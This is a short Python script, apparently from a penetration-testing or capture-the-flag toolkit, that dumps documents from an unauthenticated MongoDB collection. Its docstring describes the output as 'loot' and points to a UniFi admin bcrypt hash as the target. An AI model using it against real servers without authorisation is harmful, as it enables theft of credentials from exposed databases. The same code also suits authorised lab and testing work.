"""Dumps the documents in one MongoDB collection found by mongodb_tree.py.

mongodb_tree.py only lists database/collection names -- finding the actual
loot (e.g. Unified's ace.admin has the UniFi web-login bcrypt hash in
x_shadow) otherwise means opening mongosh and typing db.<collection>.find()
by hand. Same unauthenticated-connection assumption as mongodb_tree.py:
mongodb-info already confirmed anonymous access works before this runs.
"""
from __future__ import annotations

import argparse
import json
import sys

import pymongo
import pymongo.errors

DEFAULT_LIMIT = 20


def dump_collection(client, db_name: str, collection_name: str, limit: int) -> list[dict]:
    cursor = client[db_name][collection_name].find().limit(limit)
    return list(cursor)


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description="Dump the documents in one MongoDB collection (db/collection path).")
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, required=True)
    parser.add_argument("--path", required=True, help="db_name/collection_name")
    parser.add_argument("--limit", type=int, default=DEFAULT_LIMIT)
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args(argv)

    if "/" not in args.path:
        print(f"[-] --path는 db/collection 형식이어야 합니다: {args.path}", file=sys.stderr)
        return 1
    db_name, collection_name = args.path.split("/", 1)

    client = pymongo.MongoClient(
        args.host, args.port,
        serverSelectionTimeoutMS=int(args.timeout * 1000),
        connectTimeoutMS=int(args.timeout * 1000),
    )
    try:
        documents = dump_collection(client, db_name, collection_name, args.limit)
        if not documents:
            print("(문서 없음)")
        for doc in documents:
            print(json.dumps(doc, indent=2, default=str, ensure_ascii=False))
    except pymongo.errors.PyMongoError as exc:
        print(f"[-] 연결 실패: {exc}", file=sys.stderr)
        return 1
    finally:
        client.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
